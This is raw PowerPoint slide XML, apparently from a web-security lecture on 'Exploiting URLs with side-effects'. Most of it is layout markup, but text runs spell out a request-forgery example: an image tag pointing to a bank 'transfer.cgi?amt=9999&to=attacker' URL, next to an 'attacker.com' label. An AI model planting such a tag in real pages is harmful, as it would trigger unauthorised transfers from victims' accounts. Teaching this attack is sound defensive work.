            <a:off x="8547287" y="1638861"/>
            <a:ext cx="1818154" cy="830636"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79881" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1764926" cy="822232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="object 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1825158" cy="801310"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1765" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:spcBef>
                <a:spcPts val="27"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="70558" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:endParaRPr sz="1765" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4090147" y="1882588"/>
            <a:ext cx="4398309" cy="987519"/>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9" name="Straight Arrow Connector 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4171390" y="2353236"/>
            <a:ext cx="4317066" cy="910478"/>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16" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4143376" y="2510118"/>
            <a:ext cx="4574801" cy="1591235"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="6572884" h="2263140">
                <a:moveTo>
                  <a:pt x="6389268" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="1457705"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="183616" y="2262530"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6572884" y="804824"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6389268" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:lnRef>
          <a:fillRef idx="2">
            <a:schemeClr val="accent5"/>
          </a:fillRef>
          <a:effectRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="dk1"/>
          </a:fontRef>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="20880000">
            <a:off x="4406714" y="3166833"/>
            <a:ext cx="3478026" cy="192360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:lnSpc>
                <a:spcPts val="1545"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>=“http://HabibBank</a:t>
            </a:r>
            <a:endParaRPr sz="1588" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79887" name="object 14"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-720000">
            <a:off x="4462743" y="3282986"/>
            <a:ext cx="4416519" cy="205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714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1588"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transfer.cgi?amt=9999&amp;to=attacker”&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="291131619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78449" y="191902"/>
            <a:ext cx="7433703" cy="611065"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3971" spc="18" dirty="0"/>
              <a:t>Exploiting </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-63" dirty="0"/>
              <a:t>URLs </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-4" dirty="0"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="14" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="27" dirty="0"/>
              <a:t>side-effects</a:t>
            </a:r>
            <a:endParaRPr sz="3971"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80899" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2795868" y="2608170"/>
            <a:ext cx="1294279" cy="1392331"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80900" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="2616574"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
